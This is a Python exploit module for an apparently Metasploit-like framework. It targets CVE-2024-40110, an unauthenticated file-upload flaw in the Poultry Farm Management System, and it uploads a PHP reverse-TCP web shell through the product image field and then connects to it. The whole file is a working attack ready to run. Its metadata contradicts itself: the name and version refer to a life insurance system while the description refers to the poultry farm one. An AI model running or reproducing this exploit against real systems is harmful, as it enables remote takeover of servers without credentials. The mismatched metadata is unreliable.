#######
# Module/Exploit: Poultry Farm Management System Unauthenticated RCE
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.exploit import *

class TerasploitExploit(Exploit):
    
    module_type = 'exploit'
    payload = 'modules/payload/php/multi/reverse_tcp'
    encoder = None
    
    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'Module' : 'exploit',
                'Name' : 'Life Insurance Management System Unauthenticated RCE',
                'Module Author' : 'Charlie (4steroth)',
                'Exploit Author' : 'Jerry Thomas',
                'Version' : 'Aegon Life v1.0',
                'CVE' : 'CVE-2024-40110',
                'Exploit-DB' : 'https://www.exploit-db.com/exploits/52053',
                'NVD' : 'https://nvd.nist.gov/vuln/detail/CVE-2024-40110',
                
                'Description' : [
                    'Sourcecodester Poultry Farm Management System v1.0 contains an',
                    'Unauthenticated Remote Code Execution (RCE) vulnerability via',
                    'the product image parameter at /farm/product.php.'
                ]
            }
        )

        if info_only:
            return
        
        register_option ('exploit',opt=[
            OptURL.new('target',['','yes','url of the target']),
            OptPort.new('rport',opt=[80,'yes','target port (tcp)']),
            OptString.new('path','none',['/farm/','yes','url path to attempt the upload']),
        ])


    def exploit(self) -> tuple[str, bool]: 
        target = self.GetOPT('target')
        rport = self.GetOPT('rport')
        path = self.GetOPT('path')
        shell = self.EncodeShell(self.encoder,self.payload.shell_content())
    
        scheme, hostname = self.ParseTarget(target,return_list=['scheme','hostname'])
        rand = self.RandomName()
        
        upload_url = f"{scheme}://{hostname}:{rport}/{path.rstrip('/').lstrip('/')}/product.php"
        shell_url = f"{scheme}://{hostname}:{rport}/{path.rstrip('/').lstrip('/')}/assets/img/productimages/{rand}.php"
        Shell(shell_url).new()
        
        file = {'productimage': (f'{rand}.php',shell,'application/x-php')}
        exploit_payload = {'category': 'CHICKEN','product': 'rce','price':'100','save':''}

        try:
            exploit = HTTPClient.Request('post',url=upload_url,files=file,data=exploit_payload,verify=False)
            if exploit.status_code in self.good_status_code():
                info_print (f'Exploit success, status code: {exploit.status_code}',type='green')
                info_print (f'Shell uploaded: {shell_url}')
                return 'session', True
            else:
                info_print ('Exploit failed.',type='red')
                info_print (f'Status code: {exploit.status_code}')
                return 'session', False
            
        except requests.RequestException as error:
            info_print ('Exploit failed.')
            info_print (error,type='red')
            return 'exception', True      
        except Exception as error:
            info_print (error,type='red')
            return 'exception', True